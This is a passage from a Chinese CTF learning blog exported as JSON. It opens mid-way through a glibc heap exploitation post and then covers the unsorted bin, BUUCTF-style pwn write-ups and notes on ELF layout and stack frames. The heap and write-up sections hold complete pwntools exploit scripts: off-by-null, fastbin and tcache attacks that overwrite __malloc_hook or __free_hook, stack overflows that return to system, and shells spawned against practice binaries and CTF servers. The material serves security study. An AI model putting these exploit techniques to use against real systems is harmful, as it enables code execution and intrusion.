b&#x27;\\x00&#x27;))log.success(&#x27;fd = &#x27;+hex(fd))pause()libc_base = fd - 0x3c4b78malloc_hook=libc_base+libc.sym[&#x27;__malloc_hook&#x27;]fake_chunk_addr=malloc_hook-0x23log.success(&#x27;fake_chunk_addr = &#x27;+hex(fake_chunk_addr))free(2)add(0x120, b&#x27;\\0&#x27;*0x108+flat(0x71, fake_chunk_addr))bug()one_gadget=libc_base+0x4527arealloc_addr=libc_base+libc.sym[&#x27;__libc_realloc&#x27;]add(0x68,b&#x27;aaaa&#x27;)payload=b&#x27;a&#x27;*(0x13-0x08)+p64(one_gadget)+p64(realloc_addr+12)add(0x68,payload)p.sendline(b&#x27;1&#x27;)p.recvuntil(b&quot;How much do you want&quot;)p.sendline(b&#x27;0x18&#x27;)#bug()p.interactive()\n\nfree(2)\nadd(0x120, b’\\0’*0x108+flat(0x71, fake_chunk_addr))\n将堆块2free，申请处0x120，将堆块2的fd改了，fastbin attack\n在这里就解释一下这个\n为什么不能直接修改chunk2，因为堆块已经合并了，即使修改修改完fd也申请不出来，只能将chunk2前一个堆块先申请出来，多申请一点，带着把chunk2的fd给修改了\n3.off by null fastbin attack unlinkadd(0x80,b’chunk0’)\nadd(0x68,b’chunk1’)\nadd(0xf0,b’chunk2’)\nadd(0x10,b’chunk3’)\nbug()\nfree(0)\npayload &#x3D; b’\\x00’*0x60+p64(0x100)\nedit(1,payload)\nfree(2)\n这个与前面的一样就不解释了\n然后最关键的来了\nfree(1)（堆块1其实被free了两次）\nadd(0xa0, b’\\0’*0x88+flat(0x71, 0x6020a0-3))（堆叠改，也可以double free具体实现看下面代码）\n这个就是fastbin attack，为什么选在0x6020a0-3，因为fastbin可以申请在这里，而且距离堆块指针所在的地址近\n看一下gdb就明白了\n\nfastbin可以申请在这里\n\n并且距离指针所在地址近，往下面覆盖可以更改指针指向的地址，也就是指针的值，就行unlink一样\nadd(0x68,b’\\n’)\nadd(0x68, b’\\0’*3 + flat(0,0,0,0, elf.got[‘atoi’], elf.got[‘puts’]))\n再来理解一下这个，申请两次就把0x6020a0-3这个位置申请出来了，然后因为chunk头，我们其实是从0x6020b0-3这个位置开始写的，先写三个0对齐\n然后看gdb吧\n\n补充p64(0)*4\n然后再写就写到0x6020d0，与0x6020d8，也就是将chunk2，chunk3，指针所指向的地址改成了\nelf.got[‘atoi’], elf.got[‘puts’]\n\n\n然受show（3）泄露libc，修改堆块2，将atoi got表改成system\n4.off by null 实现double freeadd(0x80) #0add(0x68) #1add(0x1f0) #2add(0x18) #3free(0) edit(1,p64(0)*12+p64(0x100))free(2) #为了造成1uaf，1被free了但是指针位清零add(0x80) #1add(0x68) #2free(1)edit(2,p64(0x60209d))add(0x68)add(0x68)\n\n二、2.271.off by null因为2.27的Tcachebins  没有检查，可以任意地址申请，所以我们直接打__free_hook就行\nfrom pwn import *context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)libc = ELF(&#x27;/home/he/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;)p = process(&#x27;./pwn&#x27;)elf = ELF(&#x27;./pwn&#x27;)def bug():    gdb.attach(p)def add(idx,size):    p.recvuntil(&#x27;:&#x27;)    p.sendline(b&#x27;1&#x27;)    p.recvuntil(b&#x27;Index:&#x27;)    p.sendline(str(idx))    p.recvuntil(b&#x27;Size&#x27;)    p.sendline(str(size))def free(idx):    p.recvuntil(&#x27;:&#x27;)    p.sendline(b&#x27;4&#x27;)    p.recvuntil(b&#x27;Index:&#x27;)    p.sendline(str(idx))def show(idx):    p.recvuntil(&#x27;:&#x27;)    p.sendline(b&#x27;3&#x27;)    p.recvuntil(b&#x27;Index:&#x27;)    p.sendline(str(idx))def edit(idx,content):    p.recvuntil(&#x27;:&#x27;)    p.sendline(b&#x27;2&#x27;)    p.recvuntil(b&#x27;Index:&#x27;)    p.sendline(str(idx))    p.recvuntil(b&#x27;Content:&#x27;)    p.sendline(content)for i in range (7):    add(i,0xf0)add(7,0xf0)add(8,0x88)add(9,0xf0)add(10,0x10)for i in range(8):    free(i)payload = b&#x27;\\x00&#x27;*0x80+p64(0x190)edit(8,payload)free(9)for i in range(7):    add(i, 0xf0)add(7, 0xf0)show(8)libc_base = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))-0x3ebca0log.success(&#x27;libc_base--&gt;&#x27;+hex(libc_base))free_hook=libc_base+libc.sym[&#x27;__free_hook&#x27;]add(11,0x88)free(11)edit(8,p64(free_hook))add(12,0x88)add(13,0x88)system = libc.sym[&#x27;system&#x27;]+libc_baseedit(13,p64(system))edit(12,b&#x27;/bin/sh\\x00&#x27;)free(12)p.interactive()\n\nfor i in range (7):\n​    add(i,0xf0)\nadd(7,0xf0)\n先申请七个，在申请的这个就会进入unsortbins，用来泄露libc\nadd(8,0x88)\n这个堆块是在Tcachebins  中，但是也可以堆块合并堆叠，并且利用比fastbins更简单\nfor i in range(7):\n​    add(i, 0xf0)\nadd(7, 0xf0)\n这个先将7个Tcachebin申请出来，在申请一个就是unsortbins的，这样就可以泄露libc了，后面就不解释了\n","categories":["堆"],"tags":["知识点"]},{"title":"unsortbins","url":"/2025/11/18/unsortbins/","content":"\n以下是关于 unsorted bin 的 bin头 的 fd 和 bk 指向的详细解释和结构图，涵盖不同链表情形：\n\n1. 基础规则在 glibc 的堆管理中：\n\nunsorted bin 是双向循环链表，遵循 FIFO（先进先出）规则。\nbin头 的 fd：指向链表的第一个 chunk（最靠近头部的 chunk）。\nbin头 的 bk：指向链表的最后一个 chunk（最靠近尾部的 chunk）。\n空链表时：fd 和 bk 均指向 bin头 自身。\n\n\n2. 不同链表情形的结构图(1) 空链表当 unsorted bin 为空时，fd 和 bk 均指向自身：\n+-------------------+|      bin头        || fd = &amp;bin头       || bk = &amp;bin头       |+-------------------+\n\n(2) 单个 chunk（chunk1）插入一个 chunk 后，链表形成循环：\n+-------------------+       +-------------------+|      bin头        | &lt;---&gt; |      chunk1       || fd = chunk1       |       | fd = &amp;bin头        || bk = chunk1       |       | bk = &amp;bin头        |+-------------------+       +-------------------+\n\n\n逻辑：bin头 的 fd 和 bk 均指向 chunk1，chunk1 的 fd 和 bk 回指 bin头。\n\n(3) 两个 chunk（chunk1 和 chunk2）插入第二个 chunk 到链表头部后：\n+-------------------+       +-------------------+       +-------------------+|      bin头        | &lt;---&gt; |      chunk2       | &lt;---&gt; |      chunk1       || fd = chunk2       |       | fd = chunk1       |       | fd = &amp;bin头        || bk = chunk1       |       | bk = &amp;bin头        |       | bk = chunk2       |+-------------------+       +-------------------+       +-------------------+\n\n\n关键指针：\n\nbin头.fd 指向第一个 chunk（chunk2）。\n\nbin头.bk 指向最后一个 chunk（chunk1）。\n\nchunk2.fd 指向 chunk1，chunk2.bk 指向 bin头。\n\nchunk1.fd 指向 bin头，chunk1.bk 指向 chunk2。\n\n\n(4) 三个 chunk（chunk1、chunk2、chunk3）插入第三个 chunk 到链表头部后：\n+-------------------+       +-------------------+       +-------------------+       +-------------------+|      bin头        | &lt;---&gt; |      chunk3       | &lt;---&gt; |      chunk2       | &lt;---&gt; |      chunk1       || fd = chunk3       |       | fd = chunk2       |       | fd = chunk1       |       | fd = &amp;bin头        || bk = chunk1       |       | bk = &amp;bin头        |       | bk = chunk3       |       | bk = chunk2       |+-------------------+       +-------------------+       +-------------------+       +-------------------+\n\n\n逻辑：新 chunk 插入链表头部，bin头.bk 始终指向尾部 chunk（chunk1）。\n\n\n3. 动态操作示例(1) 插入新 chunk向空链表插入 chunk1：\n[初始] 空链表：bin头.fd = &amp;bin头bin头.bk = &amp;bin头[插入 chunk1]：bin头.fd = chunk1bin头.bk = chunk1chunk1.fd = &amp;bin头chunk1.bk = &amp;bin头\n\n(2) 从链表中移除 chunk从两个 chunk 的链表中移除 chunk1：\n[移除前]：bin头.fd = chunk2bin头.bk = chunk1chunk2.fd = chunk1chunk2.bk = &amp;bin头chunk1.fd = &amp;bin头chunk1.bk = chunk2[移除 chunk1 后]：+-------------------+       +-------------------+|      bin头        | &lt;---&gt; |      chunk2       || fd = chunk2       |       | fd = &amp;bin头        || bk = chunk2       |       | bk = &amp;bin头        |+-------------------+       +-------------------+\n\n\n4. 总结\nfd 和 bk 的指向规则：\n\n\n\n\n链表情形\nbin头.fd 指向\nbin头.bk 指向\n\n\n\n空链表\n&amp;bin头\n&amp;bin头\n\n\n单个 chunk\n第一个 chunk\n第一个 chunk\n\n\n多个 chunk\n第一个 chunk\n最后一个 chunk\n\n\n\n链表操作规则：\n\n插入：新 chunk 插入链表头部（bin头.fd 更新为新 chunk）。\n\n移除：从头部或尾部移除 chunk，保持双向链表的完整性。\n\n\n","categories":["堆"],"tags":["知识点"]},{"title":"BUUCTF wp","url":"/2025/01/19/wp/","content":"1.[NISACTF 2022]ReorPwn?\n用ida打开发现gets危险函数但是没有栈溢出，在调用system函数前，调用了fun函数\n看一下fun函数没看懂搜了一下，是交换字符串的位置反转一下，输入sl没有反应，直接输入galf tac，flag出来了\n\n2.[BJDCTF 2020]babystack2.0Checksec发现64位nx保护开启\n\n从题目提示看是整数溢出和栈溢出\n用idea打开发现后门函数backdoor（0x0400726）和危险函数read可以栈溢出（0x10），但是被if函数限制了得绕过if函数\n\n搜了一下wp\n\n看懂了，本来nbytes是无符号的整型（size_t），而后面转换成了有符号的整型（int）发送-1，10绕过if，且unsigned int是无符号整型，遇到-1就会变成unsigned int的最大值，使read函数能够栈溢出最后返回到后门的地址。\nexp\nfrom pwn import*r = remote(&#x27;node4.anna.nssctf.cn&#x27;,28220)p1 = b&#x27;-1&#x27;r.sendline(p1)p2 = b&#x27;a&#x27;*(0x10+0x8)+p64(0x0400726)r.sendline(p2)r.interactive()\n\n3.[BJDCTF 2020]babystack\n这道题与上一道相似，但是少了if，更简单了，buf读入的数据长度由我们输入的nbytes来决定，这里可以栈溢出，先输入一个大于0x10字节，在进行溢出就可以。\nExp\nfrom pwn import*r = remote(&#x27; [node4.anna.nssctf.cn’,28343](http://node4.anna.nssctf.cn:28343/)&#x27;)p1 = b&#x27;100&#x27;r.sendline(p1)p2 = b&#x27;a&#x27;*(0x10+0x8)+p64(0x04006E6)r.sendline(p2)r.interactive()\n\n也可以用上面一个exp因为unsigned int是无符号整型，遇到-1就会变成unsigned int的最大值\n4.[NISACTF 2022]ezstackChecksec发现是32位的。NX保护开启\nIda分析发现main函数，又发现shell函数发现read可以栈溢出，shift+f12发现system与&#x2F;bin&#x2F;sh，找到system的地址，与&#x2F;bin&#x2F;sh的地址编写exp\nfrom pwn import *p = remote(&#x27;node5.anna.nssctf.cn&#x27;, 22397)sh_addr=0x804a024system_plt=0x8048390payload=b&#x27;a&#x27;*(0x48+0x4)+p32(system_plt)+p32(sh_addr)+p32(sh_addr)                #第一个p32(sh_addr)用于占位p.sendline(payload)p.interactive()\n\n5.[GFCTF 2021]where_is_shellChecksec发现保护开启，ida查看发现危险函数read，可以栈溢出，有system函数无&#x2F;bin&#x2F;sh，不会写，看了一下wp，虽然没有&#x2F;bin&#x2F;sh字符串，但是的汇编二进制代码里的24 30可以用来表示$0，而$0指代的就是”&#x2F;bin&#x2F;sh，\n&#x2F;bin&#x2F;sh的地址为\n \npop rdi；ret地址\n \n还需要栈对齐需要\n \nExp模板\nfrom pwn import*p = remote（）payload = b&#x27;a&#x27;*(0x10 + 8) + p64(ret_addr) + p64(pop_rdi_addr) + p64(sh_addr) + p64(sys_addr)p.sendline(payload)p.interactive()\n\n \n6.[NSSCTF 2022 Spring Recruit]R3m4ke?checksec查看\nIda打开，发现危险函数gets栈溢出\n有&#x2F;bin&#x2F;sh字符串非常简单的栈溢出\n找到system的地址栈溢出返回到system地址\n \nExp\n \n7.[HNCTF 2022 Week1]easyoverflowChecksec\n \nIda打开发现gets危险函数，可以溢出，发现cat flag字符串可以作为返回地址\n地址：\nExp\n \n8.[WUSTCTF 2020]getshellChecksec\n \nIda\n发现\n可以栈溢出，发现&#x2F;bin&#x2F;sh字符串，地址\nExp\n \n9.[GDOUCTF 2023]EASY PWNIda分析发现是随机生成一个数字，猜数字\n发现gets函数，可以栈溢出\nShift+f12发现后门flag.txt \n找到地址0x0011D5 \n直接溢出\nExp如下\n \n10.others_shellcode checksec查看\n\nIda查看\n没有看懂\nNc一下\n\n直接出来了，非常神奇\n搜了一下wp\n\n","categories":["第一周"],"tags":["wp"]},{"title":"二进制基础","url":"/2025/01/14/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80/","content":"一、程序的编译与链接从C源代码到可执行文件的生成过程 \n编译： 由C语言代码生成汇编代码 \n汇编： 由汇编代码生成机器码 \n链接 ：将多个机器码的目标文件链接成一个可执行文件\n\n​                                           C语言→汇编语言→机器码\n二、Linux下的可执行文件格式（1）什么是可执行文件？广义：文件中的数据是可执行文件 \n例：\n\n\n\n.out\n.exe\n.sh\n.py\n\n\n\n狭义：文件中的数据是机器码的文件 \n例：\n\n\n\n.out\n.exe\n.dll\n.so\n\n\n\n.out .exe .dl .so \n（2）可执行文件的分类Windows：PE\n\n\n\n可执行程序\n动态链接库\n静态链接库\n\n\n\n.exe\n.dll\n.lib\n\n\nLinux：ELF\n\n\n\n可执行程序\n动态链接库\n静态链接库\n\n\n\n.out\n.so\n.a\n\n\n（3）磁盘中的ELF与内存中的ELF磁盘中的储存方式：节\n内存中的储存方式：段\n\n\n\n\nRW可写 Data段\nRX可读 Code段\n\n\n\n.data\n.rodata\n\n\n.bss\n.text\n\n\n.got\n.int\n\n\n.plt\nELF  Header\n\n\n\n\n\nStack\nHeap\nFor Kernel\nSTACK\nHEAP\nDATA\nCODE\n\n\n\n用来管理函数调用的状态\n申请动态内存的调用\n操作系统代码\n栈段\n堆段\n数据段\n代码段\n\n\nvmmap：查看程序进程的内存空间\n注：数据从低地址向高地址写 Heap：是从低往高增长 Stack：是从高往低增长（栈的增长方向是相反的）\n三、进程虚拟地址空间\n（1）地址编码地址以字节编码，1Byte&#x3D;8bits，常以16进制表示\n（2）二进制与十六进制转换1.二进制转十六进制\n例：11010110\n从右往左每四位一组1101 0110，将二进制转换为十进制在对应为十六进制\n1101&#x3D;1×2³ + 1×2² + 0×2¹ + 1×2⁰ &#x3D;13&#x3D;D\n0110&#x3D;0×2³ + 1×2² + 1×2¹ + 0×2⁰&#x3D;6\n11010110&#x3D;D6\n2.十六进制转二进制\n例：2AF\n将每个十六进制的数转换为对应的四位二进制数，在组合起来\n2&#x3D;0010\nA&#x3D;10&#x3D;1010\nF&#x3D;15&#x3D;1111\n2AF&#x3D;0010 1010 1111\n（3）虚拟内存虚拟内存用户空间每个进程一份\n虚拟内存内核空间所有进程共享一份\n虚拟内存mmap段中的动态链接库仅在物理内存中装载一份\n（4）段（segment）与节（section）\n\n\n代码段（Text segment）\n数据段（Data segment）\n\n\n\n包含了代码与只读数据\n包含了可读可写数据\n\n\n.text 节\n.data 节\n\n\n.rodata 节\n.dynamic 节\n\n\n.hash 节\n.got 节\n\n\n.dynsym 节\n.got.plt 节（保存plt节解析出的函数的实际地址）\n\n\n.dynstr 节\n.bss 节 （只占用内存的空间不占用磁盘的空间）\n\n\n.plt 节（解析动态链接函数的实际地址）\n\n\n\n.rel.got 节\n\n\n\n（5）程序数据是如何在内存中组织的\nData段：放已经初始化的全局变量\nBss段：放未初始化的全局变量\nText段：除了防止代码还放只读数据（.rodata）\nHeap段：动态存储区\nStack段：存放局部变量（随着函数执行完被丢弃）\n注：x,y是形参，当main函数调用sum函数时才会被用到，只有参数传递的时候才会被使用\n32位架构：当main函数调用sum函数时，在创建sum函数的栈帧之前，将x和y的值压栈\n64位架构：x,y不会放在虚拟内存中，而是放在寄存器中\n（6）大端序与小端序\n小端序：低地址存放数据低位、高地址存放数据高位（大部分）\n\n大端序：低地址存放数据高位、高地址存放数据低位（小部分）\n注：在C语言中0x00是字符串的结束符，大部分情况数据高位都为0，大端序低地址存放高位数据，数据是从低地址向高地址写，当进行溢出时，从低地址写入遇到0x00就直接结束了，所以小端序比大端序更好利用。\n四、程序的装载与进程的执行（1）进程的执行过程\nPC寄存器（Register）：存放当前执行指令的地址（process count）\nx86 eip x64 rip \n（2）寄存器\namd64位寄存器结构\n\n\n\n名称\n大小\n\n\n\nrax\n8Bytes\n\n\neax\n4Bytes\n\n\nax\n2Bytes\n\n\nah\n1Bytes\n\n\nal\n1Bytes\n\n\n部分寄存器的功能\n\n\n\n名称\n功能\n\n\n\nRSP\n存放当前栈帧的栈顶地址\n\n\nRBP\n存放当前栈帧的栈底地址\n\n\nRAX\n通用寄存器存放函数返回值\n\n\nRIP\n存放当前执行的指令的地址\n\n\n（3）静态链接的程序的执行过程\nuser mode：用户代码          hernel mode：操作系统代码\n（4）动态链接的程序的执行过程\n五、x86&amp;amd64汇编简述（1）常用汇编指令\n\n\nMOV\nLEA\nPUSH\nPOP\nLEAVE\nRET\n\n\n\n把源操作数传送给目标\n把源操作数的有效地址送给指定的寄存器\n把目标值压栈，同时SP指针-1字长\n将栈顶的值弹出至目的存储位置，同时SP指针+1字长\n在函数返回时，恢复父函数栈帧的指令\n在函数返回时，控制程序执行流返回父函数的指令\n\n\n（2）两种汇编格式\n\n\nintel\nAT&amp;T\n\n\n\nmov eax, 8\nmovl $8, %eax\n\n\nmov ebx, 0ffffh\nmovl $0xffff, %ebx\n\n\nint 80h\nint $80\n\n\nmov eax, [ecx]\nmovl (%ecx), %eax\n\n\n\n","categories":["第一周"],"tags":["知识点"]},{"title":"栈溢出基础","url":"/2025/01/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/","content":"一、栈的介绍（1）栈的基本概念栈（Stack）：一种后进先出（LIFO）的数据结构，用于存储程序运行时的临时数据\n栈帧（Stack Frame）：每个函数调用时，栈会分配一个栈帧，用于存储函数的局部变量、参数、返回地址等信息\n栈指针（SP）：指向当前栈顶的指针，随着压栈（Push）和出栈（Pop）操作动态变化\n基指针（BP）：指向当前栈帧的底部，用于在栈帧中定位局部变量和参数\n指令指针（IP&#x2F;EIP&#x2F;RIP）：指向当前执行的指令地址，函数调用时会保存返回地址到栈中\n（2）栈的内存布局函数调用栈是程序运行时内存中一段连续的区域，用于保存函数运行时的状态信息。这些状态信息包括：\n函数参数：调用函数时传递给被调用函数的参数\n局部变量：被调用函数中定义的变量\n返回地址：被调用函数执行完毕后，程序需要返回的位置\n保存的寄存器值：某些情况下，函数会保存一些寄存器的值，以便在函数返回时恢复\n（3）栈的先进后出特性函数调用栈被称为“栈”，是因为它遵循后进先出的原则\n压栈（Push）：当发生函数调用时，调用函数（caller）的状态被保存到栈中，被调用函数（callee）的状态被压入栈顶。\n退栈（Pop）：当函数调用结束时，栈顶的函数（callee）状态被弹出，栈顶恢复到调用函数（caller）的状态。\n（4）栈的生长方向在大多数系统中，函数调用栈在内存中是从高地址向低地址生长的\n压栈时：栈顶指针（SP）向低地址移动，栈顶对应的内存地址变小。\n退栈时：栈顶指针（SP）向高地址移动，栈顶对应的内存地址变大。\n二、 函数调用过程（1）参数传递的步骤1.逆序压栈\n调用函数（caller）按照逆序将参数依次压入栈中。这意味着最后一个参数先被压入栈，第一个参数最后被压入栈。\n例如，调用函数 callee(1，2，3) 时，参数的压栈顺序是3，2，1\npush 3    ; 第三个参数，实际是第一个一个压入栈push 2    ; 第二个参数push 1    ; 第一个参数，实际是最后一个压入栈\n\n2.参数保存\n这些参数被压入栈后，会保存在调用函数（caller）的栈帧中。此时，调用函数的栈帧仍然包含这些参数\n3.被调用函数的状态保存\n在参数压栈之后，调用函数会将控制权交给被调用函数（callee）。此时，被调用函数会创建自己的栈帧，并将这些参数视为自己的输入\n（2）栈帧的切换当被调用函数（callee）开始执行时，栈帧的切换过程如下：\n1.保存返回地址\n当调用函数使用 call 指令调用被调用函数时，call 指令会自动将调用函数的下一条指令的地址（即返回地址）压入栈中\ncall callee  ; 调用 callee 函数\n\n2.创建被调用函数的栈帧\n被调用函数（callee）会创建自己的栈帧，包括保存的寄存器值（也就是调用函数的基地址）、局部变量等\n被调用函数会从栈中读取参数，并在自己的栈帧中使用这些参数\npush ebp       ; 保存调用者的基地址mov ebp, esp   ; 建立被调用者的基地址\n\n3.执行被调用函数\n被调用函数执行其逻辑，操作局部变量和参数\n\n4.清理栈帧\n被调用函数执行完毕后，清理自己的栈帧，释放局部变量占用的空间\n返回地址从栈中弹出，存储到指令指针（IP&#x2F;EIP&#x2F;RIP）中，程序跳回调用函数的下一条指令\nmov esp, ebp  ; 恢复栈指针到调用者调用时的位置，释放局部变量占用的空间pop ebp       ; 恢复调用者的基地址    ret           ; 从栈中弹出返回地址并跳转到该地址\n\n注：\nx86\n使用栈来传递参数使用 eax 存放返回值\namd64\n前6个参数依次存放于 rdi、rsi、rdx、rcx、r8、r9 寄存器中第7个以后的参数存放于栈中\n","categories":["第一周"],"tags":["知识点"]}]